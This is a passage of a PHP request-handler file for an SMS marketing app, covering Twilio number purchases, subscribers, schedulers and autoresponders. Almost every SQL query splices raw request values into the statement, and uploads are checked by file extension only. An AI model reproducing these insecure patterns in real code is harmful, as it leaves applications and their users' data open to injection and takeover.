								'".$_REQUEST['sms_gateway']."'

							)";

			$res = mysqli_query($link,$sql);

			if($res){

			 	/*

                if($AppSettings['payment_processor'] == "3"){

                    require_once('stripe-php/init.php');

                    $data = array();

                    $data['name']=$_REQUEST['title'];

                    $data['id']=$pkgID;

                    $data['interval']="month";

                    $data['currency']="usd";

                    $data['amount']=$_REQUEST['price']*100;

                    \Stripe\Stripe::setApiKey($AppSettings['stripe_secret_key']);

                    $plan = \Stripe\Plan::create($data);

                    $resp = getProtectedValues($plan,"_lastResponse");

                    if($resp->code==200){

                        // Plan Created Successfully. 

                    }

                }

             	*/

				$_SESSION['message'] = '<div class="alert alert-success">Package plan has been saved.</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger">Error! occured while saving package plan.</div>';

			}

			header("location: view_package.php");

		}

		break;

		

		case "update_profile":{

			if($_REQUEST['password']==$_REQUEST['retype_password']){

				$sql = "update users set

							first_name='".$_REQUEST['first_name']."',

							last_name='".$_REQUEST['last_name']."',

							email='".$_REQUEST['email']."',

							password='".encodePassword($_REQUEST['password'])."',

							business_name='".$_REQUEST['business_name']."'

						where

							id='".$_REQUEST['user_id']."'";

				$res = mysqli_query($link,$sql);

				if($res){

					$_SESSION['message'] = '<div class="alert alert-success">Successfully updated.</div>';

				}else{

					$_SESSION['message'] = '<div class="alert alert-success">You made no changes to update.</div>';

				}

			}else{

				$_SESSION['message'] = '<div class="alert alert-warning">Password does not match with retype password</div>';	

			}

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "buy_number":{

			$numbers = @trim($_REQUEST['numbers']);

			$country = $_REQUEST['country'];

			$ISOcountry = $_REQUEST['ISOcountry'];

			$numbers = @explode(',',$numbers);

			if((@is_array($numbers)) || (@trim($numbers[0])!='')){

				$smsURL 	= getServerURL().'/sms_controlling.php';

				$callURL 	= getServerURL().'/call_controlling.php';

				$client 	= getTwilioConnection($_SESSION['user_id']);

				$totalNum = 0;

				if($client==false){

					echo '<span style="color:red">Not connected to twilio.</span>';

				}else{

					for($i=0;$i<count($numbers);$i++){

						$phoneNumer = $numbers[$i];

						if($_SESSION['user_type']=='1'){ // Admin

							$totalNumbers = 0;

							$userPkgInfo['phone_number_limit'] = 5000;

						}else{

							$totalNumbers = checkUserNumberslimit($_SESSION['user_id']);

							$userPkgInfo  = getAssingnedPackageInfo($_SESSION['user_id']);

						}

						if($totalNumbers<$userPkgInfo['phone_number_limit']){

							$sqln = "select id from users_phone_numbers where phone_number='".$phoneNumer."'";

							$resn = mysqli_query($link,$sqln);

							if(mysqli_num_rows($resn)==0){

								try{

									$numberResponse = $client->account->incoming_phone_numbers->create(array(

										'PhoneNumber' => $phoneNumer,

										"VoiceUrl" => $callURL,

										"SmsUrl" => $smsURL

									));

									$totalNum++;

									$ins = "insert into users_phone_numbers

									(friendly_name,phone_number,phone_sid,user_id,iso_country,country)values

									('".$phoneNumer."','".$phoneNumer."','".$numberResponse->sid."','".$_SESSION['user_id']."','".$ISOcountry."','".$country."')";

									mysqli_query($link,$ins);

								}catch(Services_Twilio_RestException $e){

									//echo $e->getMessage();

								}

								$_SESSION['message'] = '<div class="alert alert-success">Successfully purchased <b>'.$totalNum.'</b> number(s).</div>';

							}

						}else{

							$_SESSION['message'] = '<div class="alert alert-success">Your purchased numbers limit is exceeded, Currently purchased <b>'.$totalNum.'</b> number(s).</div>';			

						}

					}

				}

			}else{

				//echo 'single number '.$numbers;	

			}

		}

		break;

		

		case "remove_from_install":{

			$phoneSid 	= $_REQUEST['phoneSid'];

			$phone		= $_REQUEST['number'];

			$client 	= getTwilioConnection($_SESSION['user_id']);

			if($client==false){

				echo '<span style="color:red">Not connected to twilio.</span>';

			}else{

				$number 	= $client->account->incoming_phone_numbers->get($phoneSid);

				$number->update(array(

					"VoiceUrl" => '',

					"SmsUrl" => ''

				));

				$sql = "delete from users_phone_numbers where phone_number='".$phone."'";

				mysqli_query($link,$sql);

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Phone number successfully removed from this install.</strong> .</div>';

				echo '1';

			}

		}

		break;

		

		case "assign_to_install":{

			$phoneNumber= $_REQUEST['phone_number'];

			$phoneSid 	= $_REQUEST['phoneSid'];

			$country	= $_REQUEST['country'];

			$isoCountry = $_REQUEST['isoCountry'];

			$smsURL 	= getServerURL().'/sms_controlling.php';

			$callURL 	= getServerURL().'/call_controlling.php';

			$client 	= getTwilioConnection($_SESSION['user_id']);

			if($client==false){

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! Not connected to twilio.</strong> .</div>';

			}else{

				$number 	= $client->account->incoming_phone_numbers->get($phoneSid);

				$number->update(array(

					"VoiceUrl" => $callURL,

					"SmsUrl" => $smsURL

				));

				$sel = "select id from users_phone_numbers where phone_number='".$phoneNumber."'";

				$exe = mysqli_query($link,$sel);

				if(mysqli_num_rows($exe)==0){

					$sql = "insert into users_phone_numbers

							(friendly_name,phone_number,phone_sid,user_id,iso_country,country)values

							('".$phoneNumber."','".$phoneNumber."','".$phoneSid."','".$_SESSION['user_id']."','".$isoCountry."','".$country."')";

					$res = mysqli_query($link,$sql);

				}

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Phone number has been successfully assigned to this install.</strong> .</div>';

				echo '1';

			}

		}

		break;

		

		case "get_numbers":{

			$state 	 = $_REQUEST['state'];

			$areacode= $_REQUEST['areacode'];

			$country = $_REQUEST['country'];

			$client = getTwilioConnection($_SESSION['user_id']);

			$numbers = searchTwilioNumbers($client,$country,$state,"Local",$areacode,"");

			if($client==false){

				echo '<span style="color:red">Not connected to twilio.</span>';

			}else{

				echo '<table class="table table-striped table-bordered table-hover" id="dataTables-example2" width="90%">';

				echo '<thead>

							<tr>

								<th></th>

								<th>Friendly Name</th>

								<th>Phone Number</th>

								<th>Capabilities</th>

							</tr>

						</thead>

						<tbody>';

				if($numbers==false){

					echo '<tr><td colspan="4">No number found.</td></tr>';

				}else{

					for($i=0;$i<count($numbers);$i++){

			?>

					<tr>

						<td align="center" style="text-align:center !important">

							<input type="checkbox" name="buy_num" class="buy_num" value="<?php echo $numbers[$i]->phone_number?>">

						</td>

						<td align="center" style="text-align:center !important"><?php echo $numbers[$i]->friendly_name?></td>

						<td align="center" style="text-align:center !important"><?php echo $numbers[$i]->phone_number?></td>

						<td align="center" style="text-align:center !important">

						<?php

							if($numbers[$i]->capabilities->voice == 1)

								echo 'Voice:<span style="color:green;display:inline"><img src="images/tick.gif"> </span>'; 

							else 'Voice:<span style=" color:green;display:inline"><img src="images/cross.png"></span>';

							if($numbers[$i]->capabilities->SMS == 1)

								echo 'SMS:<span style="color:green;display:inline"><img src="images/tick.gif"> </span>';

							else	

								echo 'SMS:<span style="color:green;display:inline"><img src="images/cross.png"> </span>';

							if($numbers[$i]->capabilities->MMS == 1) 

								echo 'MMS:<span style="color:green;display:inline"><img src="images/tick.gif"> </span>';

							else

								echo 'MMS:<span style="color:green;display:inline"><img src="images/cross.png"> </span>'

						?>		

							</td>

					  </tr>

			<?php

				}

					echo '</tbody></table>';

					echo '<input type="button" value="Buy Number(s)" class="btn btn-primary" onclick="buyNumber();">';

				}

			}

		}

		break;

		

		case "get_area_codes":{

			$stateCode = $_REQUEST['state_code'];

			$sql = "select * from area_codes where state_code='".$stateCode."'";

			$res = mysqli_query($link,$sql);

			if(count($res)>0){

				echo '<option value="">- Select One -</option>';

				foreach($res as $row){

					echo '<option value="'.$row['code_number'].'">'.$row['code_number'].'</option>';

				}

			}

		}

		break;

		

		case "get_existing_numbers":{

			if($_SESSION['user_type']=='1'){

				$client = getTwilioConnection($_SESSION['user_id']);

				if($client==false){

					echo '<span style="color:red">Not connected to twilio.</span>';

				}else{

					$settings = getAppSettings($_SESSION['user_id']);

					$sr = 1;

					echo '<table width="100%" align="center" class="table table-striped table-bordered table-hover">';

					echo '<tr>';

					echo '<td>Sr#</td>';

					//echo '<td>Friendly Name</td>';

					echo '<td>Phone Number</td>';

					echo '<td>Current Install</td>';

					echo '<td>Country</td>';

					echo '<td>Capabilities</td>';

					echo '<td>Manage</td>';

					echo '</tr>';

					try{

						foreach($client->account->incoming_phone_numbers as $number){

							$lookUp = numberLookUp($settings['twilio_sid'],$settings['twilio_token'],$number->phone_number);

							echo '<tr>';

							echo '<td>'.$sr++.'</td>';

							//echo '<td>'.$number->friendly_name.'</td>';

							echo '<td>'.$number->phone_number.'</td>';

							echo '<td>';

								$array = parse_url($number->voice_url);

								$directory = explode('/',trim($array['path'],'/'));

								if(trim($array['host'])!="")

									echo $array['host'].'/'.$directory[0];

								else

									echo 'Not assigned yet.';

							echo '</td>';

							echo '<td align="center">';

								$countries = countries();

								$country   = 'N/A';

								$ISOcountry= $lookUp['country_code'];

								foreach($countries as $key => $value){

									if($key==$lookUp['country_code']){

										echo $countries[$key];

										$country = $countries[$key];

										break;

									}

								}

							echo '</td>';

							echo '<td>';

								if($number->capabilities->voice=='1'){

									echo 'Voice <img src="images/tick.gif">  ';

								}

								else{

									echo 'Voice <img src="images/cross.png">  ';		

								}

								

								if($number->capabilities->sms=='1'){

									echo 'SMS <img src="images/tick.gif">  ';

								}

								else{

									echo 'SMS <img src="images/cross.png">  ';		

								}

								if($number->capabilities->mms=='1'){

									echo 'MMS <img src="images/tick.gif">  ';

								}

								else{

									echo 'MMS <img src="images/cross.png">  ';		

								}

							echo '</td>';

							echo '<td align="center">';

								if($_SESSION['user_type']=='1'){

									echo '<img src="images/add-number.png" title="Add Number" style="vertical-align:middle; cursor:pointer; margin-right:10px" onclick="addToInstall(\''.$number->sid.'\',\''.$number->phone_number.'\',\''.$country.'\',\''.$ISOcountry.'\')">';

								}

								echo '<img src="images/cross.png" width="20" style="cursor:pointer;" title="Release Number" onclick="removeFromInstall(\''.$number->sid.'\',\''.$number->phone_number.'\')">  ';

							echo '</td>';

							echo '</tr>';

						}

					}catch(Services_Twilio_RestException $e){

						//echo $e->getMessage();

						echo 'Authentication error! Twilio sid and token is incorrect.';

					}

					echo '</table>';

				}

			}else if($_SESSION['user_type']=='2'){

				$sr = 1;

				echo '<table width="100%" align="center" class="table table-striped table-bordered table-hover">';

				echo '<tr>';

				echo '<td>Sr#</td>';

				echo '<td>Phone Number</td>';

				echo '<td>Type</td>';

				echo '</tr>';

				$sql = "select * from users_phone_numbers where user_id='".$_SESSION['user_id']."'";

				$res = mysqli_query($link,$sql);

				if(mysqli_num_rows($res)){

					while($row=mysqli_fetch_assoc($res)){

						echo '<tr>';

						echo '<td>'.$sr++.'</td>';

						echo '<td>'.$row['phone_number'].'</td>';

						echo '<td>';

							if($row['type']=='1')

								echo 'Twilio';

							else if($row['type']=='2')

								echo 'Plivo';

							if($row['type']=='3')

								echo 'Nexmo';

						echo '</td>';

						echo '</tr>';	

					}

				}else{

					echo '<tr><td colspan="3">No phone number found.</td></tr>';	

				}

				echo '</table>';

			}

		}

		break;

		

		case "get_numbers_areacode":{

			$state 	 = $_REQUEST['state'];

			$areacode= $_REQUEST['areacode'];

			$country = $_REQUEST['country'];

			$client = getTwilioConnection($_SESSION['user_id']);

			$numbers = searchTwilioNumbers($client,$country,$state,"Local",$areacode,"");

			if($client==false){

				echo '<span style="color:red">Not connected to twilio.</span>';

			}else{

				echo '<table class="table table-striped table-bordered table-hover" id="dataTables-example2" width="90%">';

				echo '<thead>

							<tr>

								<th></th>

								<th>Friendly Name</th>

								<th>Phone Number</th>

								<th>Capabilities</th>

							</tr>

						</thead>

						<tbody>';

				for($i=0;$i<count($numbers);$i++){

			?>

					<tr>

						<td align="center" style="text-align:center !important">

							<input type="checkbox" name="buy_num" class="buy_num" value="<?php echo $numbers[$i]->phone_number?>">

						</td>

						<td align="center" style="text-align:center !important"><?php echo $numbers[$i]->friendly_name?></td>

						<td align="center" style="text-align:center !important"><?php echo $numbers[$i]->phone_number?></td>

						<td align="center" style="text-align:center !important">

						<?php

							if($numbers[$i]->capabilities->voice == 1)

								echo 'Voice:<span style="color:green;display:inline"><img src="images/tick.gif"> </span>'; 

							else 'Voice:<span style=" color:green;display:inline"><img src="images/cross.png"></span>';

							if($numbers[$i]->capabilities->SMS == 1)

								echo 'SMS:<span style="color:green;display:inline"><img src="images/tick.gif"> </span>';

							else	

								echo 'SMS:<span style="color:green;display:inline"><img src="images/cross.png"> </span>';

							if($numbers[$i]->capabilities->MMS == 1) 

								echo 'MMS:<span style="color:green;display:inline"><img src="images/tick.gif"> </span>';

							else

								echo 'MMS:<span style="color:green;display:inline"><img src="images/cross.png"> </span>'

						?>		

							</td>

					  </tr>

			<?php

				}

				echo '</tbody></table>';

				echo '<input type="button" value="Buy Number(s)" class="btn btn-primary" onclick="buyNumber();">';

			}

		}

		break;

		case "delete_subscriber":{

			$sql = "delete from subscribers where id='".$_REQUEST['id']."'";

			$res = mysqli_query($link,$sql);

			if($res){

				mysqli_query($link,"delete from subscribers_group_assignment where subscriber_id='".$_REQUEST['id']."'");

				mysqli_query($link,"delete from schedulers where phone_number='".$_REQUEST['id']."'");

				mysqli_query($link,"delete from chat_history where phone_id='".$_REQUEST['id']."'");

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Subscriber deleted successfully.</strong> .</div>';	

			}else{

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Error! an error occured while deleting subscriber.</strong> .</div>';		

			}

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "update_subscriber":{

			$subsID = $_REQUEST['subscriber_id'];

			$sql = "update subscribers set

						first_name='".$_REQUEST['first_name']."',

                        email='".$_REQUEST['email']."',

						phone_number='".$_REQUEST['phone_number']."',

						city='".$_REQUEST['city']."',

						state='".$_REQUEST['state']."'

					where

						id='".$subsID."'";

			$res = mysqli_query($link,$sql);

			if($res){

				$up = "update subscribers_group_assignment set 

							group_id='".$_REQUEST['group_id']."'

						where

							id='".$_REQUEST['assignment_id']."'";

				mysqli_query($link,$up);

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Subscriber updated successfully.</strong> .</div>';	

			}else{

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Error! Error occured while updating subscriber.</strong> .</div>';		

			}

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "add_subscriber":{

			$sel = "select id from subscribers where phone_number='".$_REQUEST['phone_number']."' and user_id='".$_SESSION['user_id']."'";

			$exe = mysqli_query($link,$sel);

			if(mysqli_num_rows($exe)==0){

				$sql = "insert into subscribers

						(first_name,phone_number,email,city,state,user_id,subs_type)values

						('".DBin($_REQUEST['first_name'])."','".$_REQUEST['phone_number']."','".$_REQUEST['email']."','".$_REQUEST['city']."','".$_REQUEST['state']."','".$_SESSION['user_id']."','campaign')";

				$res = mysqli_query($link,$sql);

				if($res){

					$subsID = mysqli_insert_id($link);

					mysqli_query($link,"insert into subscribers_group_assignment

							(group_id,subscriber_id,user_id)values

							('".$_REQUEST['group_id']."','".$subsID."','".$_SESSION['user_id']."')");

					$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Subscriber added successfully.</strong> .</div>';	

				}else{

					$_SESSION['message'] = '<div class="alert alert-success"><strong>Error! Error occured while adding subscriber.</strong> .</div>';		

				}

			}else{

				$row = mysqli_fetch_assoc($exe);

				$sel = "select id from subscribers_group_assignment where group_id='".$_REQUEST['group_id']."' and subscriber_id='".$row['id']."'";

				$res = mysqli_query($link,$sel);

				if(mysqli_num_rows($res)==0){

					mysqli_query($link,"insert into subscribers_group_assignment

							(group_id,subscriber_id,user_id)values

							('".$_REQUEST['group_id']."','".$row['id']."','".$_SESSION['user_id']."')");

					$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Subscriber added successfully.</strong> .</div>';

				}else{

					mysqli_query($link,"update subscribers_group_assignment set status='1' where group_id='".$_REQUEST['group_id']."', subscriber_id='".$row['id']."'");

					$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Subscriber added successfully.</strong> .</div>';

				}

			}

			header("location: view_subscribers.php");

		}

		break;

        

        case "pagebuilder_subscriber":{



            $data = $_REQUEST['data'];

            parse_str($data, $_REQUEST);

            

            /*

            echo "<pre>";

            print_r($_REQUEST);

            die();

            */

            

            $sel = "select id from subscribers where phone_number='".$_REQUEST['phone_number']."' and user_id='".$_REQUEST['user_id']."'";

			$exe = mysqli_query($link,$sel);

			if(mysqli_num_rows($exe)==0){

				$sql = "insert into subscribers

						(first_name,phone_number,email,birthday,anniversary,user_id,subs_type)values

						('".DBin($_REQUEST['first_name'])."','".$_REQUEST['phone_number']."','".$_REQUEST['email']."','".$_REQUEST['birthday']."','".$_REQUEST['anniversary']."','".$_REQUEST['user_id']."','page_builder')";

				$res = mysqli_query($link,$sql);

				if($res){

					$subsID = mysqli_insert_id($link);

					mysqli_query($link,"insert into subscribers_group_assignment

							(group_id,subscriber_id,user_id)values

							('".$_REQUEST['group_id']."','".$subsID."','".$_REQUEST['user_id']."')");

					$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Subscriber added successfully.</strong> .</div>';	

				}else{

					$_SESSION['message'] = '<div class="alert alert-success"><strong>Error! Error occured while adding subscriber.</strong> .</div>';		

				}

			}else{

				$row = mysqli_fetch_assoc($exe);

                

                mysqli_query($link,"update subscribers set first_name='".DBin($_REQUEST['first_name'])."', email='".$_REQUEST['email']."', birthday='".$_REQUEST['birthday']."', anniversary='".$_REQUEST['anniversary']."' where id = '".$row['id']."'");

                

                

				$sel = "select id from subscribers_group_assignment where group_id='".$_REQUEST['group_id']."' and subscriber_id='".$row['id']."'";

				$res = mysqli_query($link,$sel);

				if(mysqli_num_rows($res)==0){

					mysqli_query($link,"insert into subscribers_group_assignment

							(group_id,subscriber_id,user_id)values

							('".$_REQUEST['group_id']."','".$row['id']."','".$_REQUEST['user_id']."')");

					$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Subscriber added successfully.</strong> .</div>';

				}else{

					mysqli_query($link,"update subscribers_group_assignment set status='1' where group_id='".$_REQUEST['group_id']."', subscriber_id='".$row['id']."'");

					$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Subscriber added successfully.</strong> .</div>';

				}

			}

          echo 1;  

            

		}

		break;

		

		case "delete_scheduler":{

			$sel = "select media from schedulers where id='".$_REQUEST['id']."' and media!=''";

			$exe = mysqli_query($link,$sel);

			$m   = mysqli_fetch_assoc($exe);

			$media = $m['media'];

			

			$sql = "delete from schedulers where id='".$_REQUEST['id']."'";

			$res = mysqli_query($link,$sql);

			if($res){

				if(trim($media)!=''){

					removeMedia($media);

				}

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Scheduler is deleted.</strong> .</div>';

			}

			else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! While deleting scheduler.</strong> .</div>';

			}

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		

		case "update_scheduler":{

			if($_FILES['media']['name']!=''){

				$ext = getExtension($_FILES['media']['name']);

				$extns = array('jpg','jpeg','png','bmp','gif');

				if(!in_array($ext,$extns)){

					$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! Select a valid file type.</strong> .</div>';

					header("location:".$_SERVER['HTTP_REFERER']);	

				}else{

					$fileName = uniqid().'_'.$_FILES['media']['name'];

					$tmpName  = $_FILES['media']['tmp_name'];

					@move_uploaded_file($tmpName,'uploads/'.$fileName);

					$fileName = getServerUrl().'/uploads/'.$fileName;

					removeMedia($_REQUEST['hidden_media']);

				}

			}else{

				$fileName = $_REQUEST['hidden_media'];

			}

			$date = date('Y-m-d',strtotime($_REQUEST['date']));

			$datetime = $date.' '.getTimeObj($_REQUEST['time']);

			if($_REQUEST['attach_mobile_device']!='1')

				$_REQUEST['attach_mobile_device'] = '0';

				

			$sql = "update schedulers set

						title='".DBin($_REQUEST['title'])."',

						scheduled_time='".$datetime."',

						group_id='".$_REQUEST['group_id']."',

						phone_number='".$_REQUEST['phone_number']."',

						message='".DBin($_REQUEST['message'])."',

						media='".$fileName."',

						attach_mobile_device='".$_REQUEST['attach_mobile_device']."'

					where

						id='".$_REQUEST['scheduler_id']."'";

			$res = mysqli_query($link,$sql);

			if($res){

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Your message has been scheduled successfully.</strong> .</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! an error occured while scheduling message.</strong> .</div>';

			}

            header("location: view_scheduler.php");

		}

		break;

		

		case "save_scheduler":{

			if($_FILES['media']['name']!=''){

				$ext = getExtension($_FILES['media']['name']);

				$extns = array('jpg','jpeg','png','bmp','gif');

				if(!in_array($ext,$extns)){

					$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! Select a valid file type.</strong> .</div>';

					header("location:".$_SERVER['HTTP_REFERER']);	

				}else{

					$fileName = uniqid().'_'.$_FILES['media']['name'];

					$tmpName  = $_FILES['media']['tmp_name'];

					@move_uploaded_file($tmpName,'uploads/'.$fileName);

					$fileName = getServerUrl().'/uploads/'.$fileName;

				}

			}

			$date = date('Y-m-d',strtotime($_REQUEST['date']));

			$datetime = $date.' '.getTimeObj($_REQUEST['time']);

			if($_REQUEST['attach_mobile_device']!='1')

				$_REQUEST['attach_mobile_device'] = '0';

			$sql = "insert into schedulers

						(

							title,

							scheduled_time,

							group_id,

							phone_number,

							message,media,

							user_id,

							scheduler_type,

							attach_mobile_device

						)

					values

						(

							'".DBin($_REQUEST['title'])."',

							'".$datetime."',

							'".$_REQUEST['group_id']."',

							'".$_REQUEST['phone_number']."',

							'".DBin($_REQUEST['message'])."',

							'".$fileName."',

							'".$_SESSION['user_id']."',

							'1',

							'".$_REQUEST['attach_mobile_device']."'

						)";

			$res = mysqli_query($link,$sql)or die(mysqli_error($link));

			if($res){

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Your message has been scheduled successfully.</strong> .</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! an error occured while scheduling message.</strong> .</div>';

			}

			header("location: view_scheduler.php");

		}

		break;

		

		case "get_scheduler_numbers":{

			$groupID = $_REQUEST['group_id'];

			$numberID= $_REQUEST['numberID'];

			$sql = "select s.id, s.phone_number from subscribers s, subscribers_group_assignment sga where sga.group_id='".$groupID."' and sga.subscriber_id=s.id";

			$exe = mysqli_query($link,$sql);

			$res=array();

			while($row = mysqli_fetch_array($exe)){

				$res[]=array($row['id'],$row['phone_number']);	

			}

			$res1[]=array('','All Numbers');

			$result = array_merge($res1, $res);

			echo json_encode($result);

		}

		break;

		

		case "get_group_numbers":{

			$groupID = $_REQUEST['group_id'];

			$numberID= $_REQUEST['numberID'];

            $client_id = $_REQUEST['client_id'];

            if($groupID=="all"){

                if($client_id=="all"){

                    $sql = "select s.id, s.phone_number,first_name,last_name,email from subscribers s, subscribers_group_assignment sga where sga.subscriber_id=s.id and s.status='1'";

                }else{

                    $sql = "select s.id, s.phone_number,first_name,last_name,email from subscribers s, subscribers_group_assignment sga where s.user_id = '".$client_id."' and sga.subscriber_id=s.id and s.status='1'";

                }               

            }else{

                $sql = "select s.id, s.phone_number,first_name,last_name,email from subscribers s, subscribers_group_assignment sga where sga.group_id='".$groupID."' and sga.subscriber_id=s.id and s.status='1'";

            }

			

            $res = mysqli_query($link,$sql);

			if(mysqli_num_rows($res)){

			    echo '<option value="">Select One</option>';

				echo '<option value="all">All Numbers</option>';

				while($row = mysqli_fetch_assoc($res)){

					if($numberID==$row['id'])

						$selected = 'selected="selected"';

					else

						$selected = '';



					if(trim($row['first_name'])!=''){

						$name = $row['first_name'].' '.$row['last_name'].', &nbsp;';

					}else{

						$name = '';	

					}

					if(trim($row['email'])!=''){

						$email = ',&nbsp;&nbsp;'.$row['email'];

					}else{

						$email = '';	

					}

					$info = $name.'&nbsp;&nbsp;'.$row['phone_number'].$email;

					echo '<option '.$selected.' value="'.$row['id'].'">'.$info.'</option>';

				}	

			}else{

				echo '<option value="">No subscribers found.</option>';

			}

		}

		break;

        

        case "get_groups":{

            if($_REQUEST['user_id']=="all"){

                $sql = "select id, title from campaigns";

            }else{

                $sql = "select id, title from campaigns where user_id='".$_REQUEST['user_id']."'";

            }

            

			$res = mysqli_query($link,$sql);

			if(mysqli_num_rows($res)){

			    echo '<option value="">Select One</option>';

				echo '<option value="all">All Groups</option>';

				while($row = mysqli_fetch_assoc($res)){

						echo '<option value="'.$row['id'].'">'.$row['title'].'</option>';

				}	

			}else{

				echo '<option value="">No Groups Found</option>';

			}

		}

		break;

        

        case "get_twilio_numbers":{

			$AppSettings = getAppSettings($_SESSION['user_id']);

			if($_REQUEST['user_id']=="all"){

				if($AppSettings['sms_gateway']=='twilio'){

					$seln = "select id, phone_number from users_phone_numbers where user_id='".$_SESSION['user_id']."' and type='1'";

				}else if($AppSettings['sms_gateway']=='plivo'){

					$seln = "select id, phone_number from users_phone_numbers where user_id='".$_SESSION['user_id']."' and type='2'";

				}

				else if($AppSettings['sms_gateway']=='nexmo'){

					$seln = "select id, phone_number from users_phone_numbers where user_id='".$_SESSION['user_id']."' and type='3'";

				}

            }else{

			    if($AppSettings['sms_gateway']=='twilio'){

					$seln = "select id, phone_number from users_phone_numbers where user_id='".$_REQUEST['user_id']."' and type='1'";

				}else if($AppSettings['sms_gateway']=='plivo'){

					$seln = "select id, phone_number from users_phone_numbers where user_id='".$_REQUEST['user_id']."' and type='2'";

				}

				else if($AppSettings['sms_gateway']=='nexmo'){

					$seln = "select id, phone_number from users_phone_numbers where user_id='".$_REQUEST['user_id']."' and type='3'";

				}

			}

			$resn = mysqli_query($link,$seln);

			if(mysqli_num_rows($resn)){

				while($rown = mysqli_fetch_assoc($resn)){

					echo '<option value="'.$rown['phone_number'].'">'.$rown['phone_number'].'</option>';

				}	

			}else{

				echo '<option value="">No phone number found.</option>';	

			}

		}

		break;

		

		case "delete_autores":{

			$sql = "delete from campaigns where id='".$_REQUEST['id']."'";

			$res = mysqli_query($link,$sql);

			if($res){

				removeMedia($_REQUEST['media']);

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Autoresponder is deleted.</strong> .</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! While deleting autoresponder.</strong> .</div>';

			}

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "update_autores":{

			$specialChars = specialCharacters();

			$keyword = str_replace($specialChars,'',$_REQUEST['keyword']);

			if(checkKeyword($_SESSION['user_id'],$keyword,$_REQUEST['campaign_id'])){

				if($_FILES['campaign_media']['name']!=''){

					$ext = getExtension($_FILES['campaign_media']['name']);

					$extns = array('jpg','jpeg','png','bmp','gif');

					if(!in_array($ext,$extns)){

						$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! Select a valid file type.</strong> .</div>';

						header("location:".$_SERVER['HTTP_REFERER']);	

					}else{

						$fileName = uniqid().'_'.$_FILES['campaign_media']['name'];

						$tmpName  = $_FILES['campaign_media']['tmp_name'];

						@move_uploaded_file($tmpName,'uploads/'.$fileName);

						$fileName = getServerUrl().'/uploads/'.$fileName;

						removeMedia($_REQUEST['hidden_campaign_media']);

					}

				}else{

					$fileName = $_REQUEST['hidden_campaign_media'];

				}

				$title = DBin($_REQUEST['title']);

				$phoneNumber = $_REQUEST['phone_number'];

				$welcomeSms  = DBin($_REQUEST['welcome_sms']);

				$alreadyMemberSms = DBin($_REQUEST['already_member_sms']);

				if($_REQUEST['direct_subscription']!='1')

					$_REQUEST['direct_subscription'] = '0';

				

				$sql = "update campaigns set

							title='".$title."',

							keyword='".$keyword."',

							phone_number='".$phoneNumber."',

							type='2',

							welcome_sms='".$welcomeSms."',

							already_member_msg='".$alreadyMemberSms."',

							media='".$fileName."',

							attach_mobile_device='".$_REQUEST['attach_mobile_device']."',

							direct_subscription='".$_REQUEST['direct_subscription']."'

						where

							id='".$_REQUEST['campaign_id']."'";

				$res = mysqli_query($link,$sql);

				if($res){

					$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Autoresponder update successfully.</strong> .</div>';	

				}else{

					$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! while updating autoresponder.</strong> .</div>';	

				}

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! <b>'.$_REQUEST['keyword'].'</b> is already used or maybe reserve keyword, try another.</strong> .</div>';

			}

			header('location: '.$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "create_autores":{


			$specialChars = specialCharacters();

			$keyword = str_replace($specialChars,'',$_REQUEST['keyword']);

			if(checkKeyword($_SESSION['user_id'],$keyword,$_REQUEST['campaign_id'])){

				if($_FILES['campaign_media']['name']!=''){

					$ext = getExtension($_FILES['campaign_media']['name']);

					$extns = array('jpg','jpeg','png','bmp','gif');

					if(!in_array($ext,$extns)){

						$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! Select a valid file type.</strong> .</div>';

						header("location:".$_SERVER['HTTP_REFERER']);	

					}else{

						$fileName = uniqid().'_'.$_FILES['campaign_media']['name'];

						$tmpName  = $_FILES['campaign_media']['tmp_name'];

						@move_uploaded_file($tmpName,'uploads/'.$fileName);

						$fileName = getServerUrl().'/uploads/'.$fileName;

					}

				}

				$title = DBin($_REQUEST['title']);

				$phoneNumber = $_REQUEST['phone_number'];

				$welcomeSms  = DBin($_REQUEST['welcome_sms']);

				$alreadyMemberSms = DBin($_REQUEST['already_member_sms']);

				if($_REQUEST['direct_subscription']!='1')

					$_REQUEST['direct_subscription'] = '0';

					

				$sql = "insert into campaigns(title,

				keyword,phone_number,type,welcome_sms,already_member_msg,media,user_id,attach_mobile_device,direct_subscription)values

						('".$title."','".$keyword."','".$phoneNumber."','2','".$welcomeSms."','".$alreadyMemberSms."','".$fileName."','".$_SESSION['user_id']."','".$_REQUEST['attach_mobile_device']."','".$_REQUEST['direct_subscription']."')";

